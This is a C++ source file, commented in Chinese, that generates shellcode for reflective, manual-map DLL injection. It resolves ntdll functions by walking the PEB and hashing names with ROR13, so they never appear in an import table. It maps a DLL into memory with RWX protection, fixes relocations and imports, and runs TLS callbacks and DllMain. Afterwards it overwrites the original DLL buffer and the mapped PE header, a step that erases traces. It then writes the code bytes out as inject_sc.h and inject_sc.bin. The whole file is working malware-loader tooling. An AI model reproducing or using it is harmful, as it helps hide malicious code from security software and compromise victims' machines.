#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <string>
#include <fstream>

using fnLdrGetProcedureAddress = NTSTATUS(WINAPI*)(IN PVOID DllHandle, IN PANSI_STRING ProcedureName OPTIONAL, IN ULONG ProcedureNumber OPTIONAL, OUT FARPROC* ProcedureAddress);
using fnRtlFreeUnicodeString = VOID(WINAPI*)(_Inout_ PUNICODE_STRING UnicodeString);
using fnRtlInitAnsiString = VOID(WINAPI*)(_Out_ PANSI_STRING DestinationString, _In_opt_ PCSZ SourceString);
using fnRtlAnsiStringToUnicodeString = NTSTATUS(WINAPI*)(_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString, _In_ BOOLEAN AllocateDestinationString);
using fnLdrLoadDll = NTSTATUS(WINAPI*)(PWCHAR, PULONG, PUNICODE_STRING, PHANDLE);
using fnNtAllocateVirtualMemory = NTSTATUS(WINAPI*)(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect);
#ifdef _WIN64
using fnRtlAddFunctionTable = BOOL(WINAPIV*)(PRUNTIME_FUNCTION FunctionTable, DWORD EntryCount, DWORD64 BaseAddress);
#endif

using fnNtFreeVirtualMemory = NTSTATUS(WINAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG);

struct InjectParams
{
	PVOID ptr; // mmap后Dll的位置
	PVOID dll; // 写过去Dll文件的位置
	SIZE_T dll_size; // dll大小
	BOOL is_done;
};

struct ShadowApi
{
	fnLdrGetProcedureAddress lpfnLdrGetProcedureAddress;
	fnRtlFreeUnicodeString lpfnRtlFreeUnicodeString;
	fnRtlInitAnsiString lpfnRtlInitAnsiString;
	fnRtlAnsiStringToUnicodeString lpfnRtlAnsiStringToUnicodeString;
	fnLdrLoadDll lpfnLdrLoadDll;
	fnNtAllocateVirtualMemory lpfnNtAllocateVirtualMemory;
#ifdef _WIN64
	fnRtlAddFunctionTable lpfnRtlAddFunctionTable;
#endif
	fnNtFreeVirtualMemory lpfnNtFreeVirtualMemory;
};

// 预定义以后，直接在代码中是第一个函数
VOID ManualInject(InjectParams* params);

constexpr auto ROR_SHIFT = 13;
constexpr DWORD ct_ror(DWORD n)
{
	return (n >> ROR_SHIFT) | (n << (sizeof(DWORD) * CHAR_BIT - ROR_SHIFT));
}

constexpr char ct_upper(const char c)
{
	return (c >= 'a') ? (c - ('a' - 'A')) : c;
}

constexpr DWORD ct_hash(const char* str, DWORD sum = 0)
{
	return *str ? ct_hash(str + 1, ct_ror(sum) + ct_upper(*str)) : sum;
}

DWORD rt_hash(const char* str)
{
	DWORD h = 0;
	while (*str)
	{
		h = (h >> ROR_SHIFT) | (h << (sizeof(DWORD) * CHAR_BIT - ROR_SHIFT));
		h += *str >= 'a' ? *str - ('a' - 'A') : *str;
		str++;
	}
	return h;
}

wchar_t __tolower(wchar_t ch) {
	if (ch >= 65 && ch <= 90) {
		return ch - 65 + 97;
	}
	else {
		return ch;
	}
}

wchar_t* __strstrw(const wchar_t* str, const wchar_t* sub, bool nocase)
{
	while (*str)
	{
		const wchar_t* p1 = str, * p2 = sub;
		while (nocase ? (*p1 && *p2 && __tolower(*p1) == __tolower(*p2)) : (*p1 && *p2 && *p1 == *p2)) {
			p1++; p2++;
		}
		if (!*p2) return (wchar_t*)str;
		str++;
	}
	return NULL;
}

wchar_t* __wstrcpy_s(wchar_t* dest, const wchar_t* src, int len)
{
	// Copy the source string to the dest string until we reach len or the end of the source string
	int i = 0;
	while (*src && i < len) {
		*dest++ = *src++;
		i++;
	}

	// Add null terminator to dest
	*dest = 0x0000;

	return dest;
}

PPEB get_peb()
{
#ifndef _WIN64
	return reinterpret_cast<PPEB>(__readfsdword(0x30));
#else
	return reinterpret_cast<PPEB>(__readgsqword(0x60));
#endif
}

LDR_DATA_TABLE_ENTRY* get_dataTable_entry(const LIST_ENTRY* ptr)
{
	int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	return (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - list_entry_offset);
}

PVOID get_func_by_hash(DWORD hash)
{
	PEB* peb = get_peb();
	LIST_ENTRY* first = peb->Ldr->InMemoryOrderModuleList.Flink;
	LIST_ENTRY* ptr = first;
	do
	{
		const auto dte = get_dataTable_entry(ptr);
		ptr = ptr->Flink;

		const auto base_addr = static_cast<PUCHAR>(dte->DllBase);
		if (!base_addr)
		{
			continue;
		}

		auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(base_addr);
		auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(base_addr + dosHeader->e_lfanew);
		if (DWORD rva_export = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
		{
			auto export_dir_ptr = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(base_addr + rva_export);
			const char* moduleName = reinterpret_cast<PCHAR>(base_addr + export_dir_ptr->Name);
			uint32_t moduleHash = rt_hash(moduleName);
			auto nameRVAs = reinterpret_cast<DWORD*>(base_addr + export_dir_ptr->AddressOfNames);
			for (DWORD i = 0; i < export_dir_ptr->NumberOfNames; ++i)
			{
				const char* func_name = reinterpret_cast<PCHAR>(base_addr + nameRVAs[i]);
				if (hash == moduleHash + rt_hash(func_name))
				{
					WORD ordinal = (reinterpret_cast<WORD*>(base_addr + export_dir_ptr->AddressOfNameOrdinals))[i];
					DWORD rva_func = (reinterpret_cast<DWORD*>(base_addr + export_dir_ptr->AddressOfFunctions))[ordinal];
					return base_addr + rva_func;
				}
			}
		}
	}
	while (ptr != first);

	return nullptr;
}

PVOID get_module_base(const PUNICODE_STRING module_name)
{
	PVOID module_base = NULL;
	PEB* peb = get_peb();
	for (auto pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink; pListEntry != &peb->Ldr->InMemoryOrderModuleList; pListEntry = pListEntry->Flink)
	{
		PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		wchar_t ldr_mn[MAX_PATH] = { 0 },arg_mn[MAX_PATH] = {0};
		__wstrcpy_s(ldr_mn, pEntry->FullDllName.Buffer, pEntry->FullDllName.Length);
		__wstrcpy_s(arg_mn, module_name->Buffer, module_name->Length);
		if (__strstrw(ldr_mn, arg_mn, true))
		{
			module_base = pEntry->DllBase;
			break;
		}
	}
	return module_base;
}

#define MACRO_GET_FUNC_PTR(module, function,out) \
	constexpr DWORD hash_##function = ct_hash(module) + ct_hash(#function); \
	##out =(decltype(##out))get_func_by_hash(hash_##function)

VOID ManualInject(InjectParams* params)
{
	ShadowApi api{};
	MACRO_GET_FUNC_PTR("ntdll.dll", LdrGetProcedureAddress, api.lpfnLdrGetProcedureAddress);
	MACRO_GET_FUNC_PTR("ntdll.dll", LdrLoadDll, api.lpfnLdrLoadDll);
	MACRO_GET_FUNC_PTR("ntdll.dll", NtAllocateVirtualMemory, api.lpfnNtAllocateVirtualMemory);
	MACRO_GET_FUNC_PTR("ntdll.dll", RtlAnsiStringToUnicodeString, api.lpfnRtlAnsiStringToUnicodeString);
	MACRO_GET_FUNC_PTR("ntdll.dll", RtlFreeUnicodeString, api.lpfnRtlFreeUnicodeString);
	MACRO_GET_FUNC_PTR("ntdll.dll", RtlInitAnsiString, api.lpfnRtlInitAnsiString);
	MACRO_GET_FUNC_PTR("ntdll.dll", NtFreeVirtualMemory, api.lpfnNtFreeVirtualMemory);
#ifdef _WIN64
	MACRO_GET_FUNC_PTR("ntdll.dll", RtlAddFunctionTable, api.lpfnRtlAddFunctionTable);
#endif

	do
	{
		// 检查数据是否合法
		if (params->dll_size < sizeof(IMAGE_DOS_HEADER))
			break;

		// 校验DOS头
		const auto pDosHeader = static_cast<PIMAGE_DOS_HEADER>(params->dll);
		if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
			break;

		// 校验PE头
		const auto pNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(static_cast<PUCHAR>(params->dll) + pDosHeader->
			e_lfanew);
		if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
			break;
		if ((pNtHeader->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0)
			break;
		if ((pNtHeader->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0)
			break;
		if (pNtHeader->FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER))
			break;

		// 计算拉伸后的大小
		const auto pSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<PUCHAR>(pNtHeader) + sizeof(
			IMAGE_NT_HEADERS));
		if (!pSectionHeader)
			break;

		auto nAlign = pNtHeader->OptionalHeader.SectionAlignment;
		auto uSize = (pNtHeader->OptionalHeader.SizeOfHeaders + nAlign - 1) / nAlign * nAlign;
		for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; ++i)
		{
			int CodeSize = pSectionHeader[i].Misc.VirtualSize;
			int LoadSize = pSectionHeader[i].SizeOfRawData;
			int MaxSize = (LoadSize > CodeSize) ? (LoadSize) : (CodeSize);
			int SectionSize = (pSectionHeader[i].VirtualAddress + MaxSize + nAlign - 1) / nAlign * nAlign;
			if (uSize < SectionSize)
				uSize = SectionSize;
		}

		if (uSize == NULL)
			break;

		// 申请内存
		api.lpfnNtAllocateVirtualMemory((HANDLE)-1, &params->ptr, 0, reinterpret_cast<PSIZE_T>(&uSize), MEM_COMMIT,PAGE_EXECUTE_READWRITE);
		if (params->ptr == nullptr)
			break;

		auto pMemoryAddr = static_cast<PCHAR>(params->ptr);

		// 计算需要复制的PE头+段表字节数
		int HeaderSize = pNtHeader->OptionalHeader.SizeOfHeaders;
		int SectionSize = pNtHeader->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
		int MoveSize = HeaderSize + SectionSize;
		// 复制头和段信息
		for (int i = 0; i < MoveSize; i++)
		{
			*(pMemoryAddr + i) = *(static_cast<PCHAR>(params->dll) + i);
		}

		//复制每个节
		for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; ++i)
		{
			if (pSectionHeader[i].VirtualAddress == 0 || pSectionHeader[i].SizeOfRawData == 0)
				continue;

			// 复制段数据到虚拟内存
			auto pSectionAddress = pMemoryAddr + pSectionHeader[i].VirtualAddress;
			for (size_t k = 0; k < pSectionHeader[i].SizeOfRawData; k++)
			{
				*(pSectionAddress + k) = *(static_cast<PCHAR>(params->dll) + pSectionHeader[i].PointerToRawData + k);
			}
		}

		// 修复重定向
		if (pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
		{
			size_t Delta = reinterpret_cast<uintptr_t>(pMemoryAddr) - pNtHeader->OptionalHeader.ImageBase;
			uintptr_t* pAddress = nullptr;
			//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址
			auto pLoc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(pMemoryAddr + pNtHeader->OptionalHeader.DataDirectory[
				IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
			while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //开始扫描重定位表
			{
				auto pLocData = reinterpret_cast<uint16_t*>(reinterpret_cast<PCHAR>(pLoc) + sizeof(IMAGE_BASE_RELOCATION));
				int NumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
				//计算需要修正的重定位项（地址）的数目
				for (int i = 0; i < NumberOfReloc; i++)
				{
					int type = (pLocData[i] & 0xF000) >> 12;
					if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) //这是一个需要修正的地址
					{
						pAddress = reinterpret_cast<uintptr_t*>(pMemoryAddr + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
						*pAddress += Delta;
					}
				}
				//转移到下一个节进行处理
				pLoc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<PCHAR>(pLoc) + pLoc->SizeOfBlock);
			}
		}

		// 修复IAT
		if (pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
		{
			auto pID = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(pMemoryAddr + pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
			while (pID->Characteristics != 0)
			{
				// 获取dll的名字
				const char* pName = pMemoryAddr + pID->Name;
				HANDLE hDll = nullptr;
				ANSI_STRING ansiStr{};
				UNICODE_STRING UnicodeString{};
				api.lpfnRtlInitAnsiString(&ansiStr, pName);
				api.lpfnRtlAnsiStringToUnicodeString(&UnicodeString, &ansiStr, true);

				// 优先从ldr获取
				hDll = get_module_base(&UnicodeString);
				if(!hDll)
				{
					api.lpfnLdrLoadDll(nullptr, nullptr, &UnicodeString, &hDll);
				}
				api.lpfnRtlFreeUnicodeString(&UnicodeString);
				if (hDll == nullptr)
				{
					api.lpfnNtFreeVirtualMemory((HANDLE)-1,&params->ptr, reinterpret_cast<PSIZE_T>(&uSize), MEM_DECOMMIT);
					goto end;
				}

				auto pRealIAT = reinterpret_cast<PIMAGE_THUNK_DATA>(pMemoryAddr + pID->FirstThunk);
				auto pOriginalIAT = reinterpret_cast<PIMAGE_THUNK_DATA>(pMemoryAddr + pID->OriginalFirstThunk);
				for (int i = 0; ; i++)
				{
					if (pOriginalIAT[i].u1.Function == 0)
						break;

					FARPROC lpFunction = nullptr;
					if (IMAGE_SNAP_BY_ORDINAL(pOriginalIAT[i].u1.Ordinal)) 
					{
						//这里的值给出的是导出序号
						if (IMAGE_ORDINAL(pOriginalIAT[i].u1.Ordinal))
						{
							api.lpfnLdrGetProcedureAddress(hDll, nullptr, IMAGE_ORDINAL(pOriginalIAT[i].u1.Ordinal),
							                               &lpFunction);
						}
					}
					else 
					{
						//按照名字导入
						PIMAGE_IMPORT_BY_NAME pByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(pMemoryAddr + pOriginalIAT[i].u1.AddressOfData);
						if (pByName->Name)
						{
							api.lpfnRtlInitAnsiString(&ansiStr, pByName->Name);
							api.lpfnLdrGetProcedureAddress(hDll, &ansiStr, 0, &lpFunction);
						}
					}

					//found!
					if (lpFunction != nullptr)
					{
						pRealIAT[i].u1.Function = reinterpret_cast<ULONGLONG>(lpFunction);
					}
					else
					{
						api.lpfnNtFreeVirtualMemory((HANDLE)-1, &params->ptr, reinterpret_cast<PSIZE_T>(&uSize), MEM_DECOMMIT);
						goto end;
					}
				}

				pID = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<PCHAR>(pID) + sizeof(IMAGE_IMPORT_DESCRIPTOR));
			}
		}

		// 注册TLS
		if (pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size)
		{
			auto pTLS = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(pMemoryAddr + pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
			auto* pCallback = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(pTLS->AddressOfCallBacks);
			for (; pCallback && *pCallback; ++pCallback)
			{
				(*pCallback)(params->ptr, DLL_PROCESS_ATTACH, nullptr);
			}
		}

		// 异常
#ifdef _WIN64
		auto excep = pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
		if (excep.Size)
		{
			api.lpfnRtlAddFunctionTable(
				reinterpret_cast<IMAGE_RUNTIME_FUNCTION_ENTRY*>(pMemoryAddr + excep.VirtualAddress),
				excep.Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY),
				reinterpret_cast<uintptr_t>(params->ptr));
		}
#endif

		// Call DllMain
		pNtHeader->OptionalHeader.ImageBase = reinterpret_cast<uintptr_t>(pMemoryAddr);
		auto DllMain = reinterpret_cast<BOOL(__stdcall*)(LPVOID, DWORD, LPVOID)>(pNtHeader->OptionalHeader.AddressOfEntryPoint + pMemoryAddr);
		DllMain(pMemoryAddr, DLL_PROCESS_ATTACH, nullptr);

		// 清空映射过来的DLL文件
		for (int i = 0; i < params->dll_size; i++)
			*(static_cast<PCHAR>(params->dll) + i) = i;

		// 抹掉PE Header  （这里填定值会被优化成memset
		for (int i = 0; i < HeaderSize; i++)
			*(static_cast<PCHAR>(params->ptr) + i) = i;
	}
	while (false);
	end:
	params->is_done = TRUE;
}

#ifndef _WIN64
__declspec(naked) void MalCodeEnd() { };
#else
void MalCodeEnd() {};
#endif

BOOL write_shellcode_to_file()
{

	try
	{
		std::string buffer = "static const unsigned char inject_sc[] = {\n";
		auto start = reinterpret_cast<uintptr_t>(ManualInject);
		auto end = reinterpret_cast<uintptr_t>(MalCodeEnd);
		int num = 0;
		for (auto i = start; i < end; i++)
		{
			char Temp[10]{};
			if (i == end - 1)
			{
				sprintf_s(Temp, "0x%0.2x", *(BYTE*)i);
			}
			else
			{
				sprintf_s(Temp, "0x%0.2x ,", *(BYTE*)i);
			}
			buffer += Temp;
			num++;
			if ((num % 15) == 0 && num != 0)
			{
				buffer += "\n";
			}
		}
		buffer += "};";
		std::ofstream fs("inject_sc.h", std::ios::ate | std::ios::out);
		fs << buffer;
		fs.close();

		DWORD dwWritten;
		HANDLE hFile = CreateFileA("inject_sc.bin", GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, NULL, NULL);

		if (!hFile)
		{
			return false;
		}

		if (WriteFile(hFile, &ManualInject, (end - start), &dwWritten, NULL))
		{
			CloseHandle(hFile);
			return true;
		}

		CloseHandle(hFile);
		return true;
	}
	catch (const std::exception& e)
	{
		printf("exception :%s\n",e.what());
		return false;
	}
}

int main()
{
	write_shellcode_to_file();

	/*InjectParams p{};
	p.dll = hexData;
	p.dll_size = sizeof(hexData);

	ManualInject(&p);*/
	return 0;
}